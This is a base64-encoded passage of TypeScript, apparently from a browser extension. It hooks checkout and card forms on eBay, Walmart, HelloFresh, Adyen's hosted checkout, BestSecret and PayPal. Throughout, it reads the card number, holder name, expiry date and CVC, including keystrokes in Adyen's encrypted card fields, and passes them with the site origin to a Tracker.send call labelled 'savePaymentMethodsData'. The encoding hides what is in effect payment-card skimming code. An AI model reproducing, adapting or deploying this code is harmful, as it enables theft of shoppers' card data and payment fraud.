W1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS5pZC5pbmRleE9mKCdjYXJkTicpICE9PSAtMSA/IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS5pZCA9PT0gJ2NhcmRCcmFuZCcgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLmlkID09PSAnY2FyZEhvbGRlcicgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLmlkID09PSAnZXhwaXJlcycgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZENWQyc6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLmlkID09PSAnY3ZjJyA/IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSovXG4gICAgICAgICAgICB9XG5cbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ2ViYXknKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsMSk7XG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmZvckVhY2goZnVuY3Rpb24gKF9fZWJheUNyZWRpdENhcmRGb3JtRWxlbWVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2ViYXlDcmVkaXRDYXJkRm9ybUVsZW1lbnQuaWQgPT09ICdjcmVkaXQtY2FyZC1kZXRhaWxzJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGVsZW1lbnRzOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlRWJheVBheW1lbnREYXRhQ29sbGVjdGlvbihzZWxmLCBfX2ViYXlDcmVkaXRDYXJkRm9ybUVsZW1lbnQsIGVsZW1lbnRzKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0sIDEwMCk7XG4gICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNyb290JykgIT09IG51bGwgJiYgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNpYy1tb2R1bGUnKSAhPT0gbnVsbCAmJiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuYnRuLmJ0bi0tcHJpbWFyeS5maWVsZCcpICE9PSBudWxsKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuYnRuLmJ0bi0tcHJpbWFyeS5maWVsZCcpPy5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIFtcImNsaWNrXCIsIFwiZGJsY2xpY2tcIl0uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcFBheW1lbnRNZXRob2RzU3RvcmU6IGFueSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5idG4uYnRuLS1wcmltYXJ5LmZpZWxkJyk/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2ljLW1vZHVsZScpIGFzIEhUTUxFbGVtZW50KSwgJ2NyZWRpdENhcmROdW1iZXInLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jaWMtbW9kdWxlJykgYXMgSFRNTEVsZW1lbnQpLCAnZmlyc3ROYW1lJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2ljLW1vZHVsZScpIGFzIEhUTUxFbGVtZW50KSwgJ2xhc3ROYW1lJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2ljLW1vZHVsZScpIGFzIEhUTUxFbGVtZW50KSwgJ2V4cGlyYXRpb25EYXRlJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2ljLW1vZHVsZScpIGFzIEhUTUxFbGVtZW50KSwgJ2N2dicsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS5pZC5pbmRleE9mKCdjcmVkaXRDYXJkTnVtYmVyJykgIT09IC0xID8gdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5mbG9hdGluZy1pbnB1dF9fZml4cmlnaHQnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmNsYXNzTmFtZSA/IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5mbG9hdGluZy1pbnB1dF9fZml4cmlnaHQnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmNsYXNzTmFtZS50b0xvd2VyQ2FzZSgpIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMV0udmFsdWUgKyAnICcgKyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVsyXS52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzNdLmlkID09PSAnZXhwaXJhdGlvbkRhdGUnID8gdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbM10udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVs0XS5pZCA9PT0gJ2N2dicgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVs0XS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXG4gICAgICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCd3YWxtYXJ0JykgIT09IC0xKSB7XG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xuICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5ocmVmLmluZGV4T2YoJyMvcGF5bWVudCcpICE9PSAtMSB8fCB3aW5kb3cubG9jYXRpb24uaHJlZi5pbmRleE9mKCdhY2NvdW50L2NyZWRpdGNhcmRzJykgIT09IC0xKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVdhbG1hcnRQYXltZW50Q29udGFpbmVyKHNlbGYpO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24uaHJlZi5pbmRleE9mKCcjL3JldmlldycpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVXYWxtYXJ0UGF5bWVudEVkaXRCdXR0b24oc2VsZik7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9LCAxMDApO1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdoZWxsb2ZyZXNoLmRlJykgIT09IC0xKSB7XG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xuICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5SZWFjdE1vZGFsUG9ydGFsJykubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5SZWFjdE1vZGFsUG9ydGFsJykuZm9yRWFjaChmdW5jdGlvbiAobW9kYWwpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAobW9kYWwuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlSGVsbG9GcmVzaFBheW1lbnRDb250YWluZXIoc2VsZiwgbW9kYWwsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX2RldGVjdGVkRWxlbWVudC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogd2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2NhcmROdW1iZXInKSAhPT0gdW5kZWZpbmVkID8gd2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2NhcmROdW1iZXInKSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogd2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2NhcmRFeHBpcmUnKSAhPT0gdW5kZWZpbmVkID8gd2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2NhcmRFeHBpcmUnKSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogd2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2NhcmRDVkMnKSAhPT0gdW5kZWZpbmVkID8gd2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2NhcmRDVkMnKSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LnNlc3Npb25TdG9yYWdlLmNsZWFyKCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9LCAxMDApO1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdjaGVja291dHNob3BwZXItbGl2ZS5hZHllbi5jb20nKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsMSk7XG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignYm9keScpICE9PSBudWxsKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignYm9keScpIGFzIEhUTUxFbGVtZW50KSwgJ2VuY3J5cHRlZCcsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX2RldGVjdGVkRWxlbWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXl1cCcsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fZGV0ZWN0ZWRFbGVtZW50LmlkID09PSAnZW5jcnlwdGVkQ2FyZE51bWJlcicpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5zZXRJdGVtKCdjYXJkTnVtYmVyJywgX19kZXRlY3RlZEVsZW1lbnQudmFsdWUpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fZGV0ZWN0ZWRFbGVtZW50LmlkID09PSAnZW5jcnlwdGVkRXhwaXJ5RGF0ZScpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5zZXRJdGVtKCdjYXJkRXhwaXJlJywgX19kZXRlY3RlZEVsZW1lbnQudmFsdWUpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fZGV0ZWN0ZWRFbGVtZW50LmlkID09PSAnZW5jcnlwdGVkU2VjdXJpdHlDb2RlJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LnNlc3Npb25TdG9yYWdlLnNldEl0ZW0oJ2NhcmRDVkMnLCBfX2RldGVjdGVkRWxlbWVudC52YWx1ZSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSwgMTAwKTtcbiAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4uaW5kZXhPZignYmVzdHNlY3JldC5jb20nKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsMSk7XG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVCZXN0U2VjcmV0UGF5bWVudENvbnRhaW5lcihzZWxmKTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0sIDEwMCk7XG4gICAgICAgICAgICB9XG5cbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ3BheXBhbCcpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcbiAgICAgICAgICAgICAgICAvKmxldCBseHQgPSAnNFdFNTY5MzhOUzY5MTU5MVQnKi9cbiAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdmb3JtJykgIT09IG51bGwpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xuICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmZvckVhY2goZnVuY3Rpb24gKF9fcGF5cGFsRm9ybUVsZW1lbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19wYXlwYWxGb3JtRWxlbWVudC5hY3Rpb24uaW5kZXhPZignbXlhY2NvdW50L21vbmV5JykgIT09IC0xIHx8IHdpbmRvdy5sb2NhdGlvbi5ocmVmLmluZGV4T2YoJ3dlYmFwcHMnKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGVsZW1lbnRzOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5UGFsUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9fcGF5cGFsRm9ybUVsZW1lbnQsIGVsZW1lbnRzLCBmdW5jdGlvbiAoY29udHJvbGxlciwgZWxlbWVudHMpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRyb2xsZXIuYWRkRXZlbnRMaXN0ZW5lcihldmVu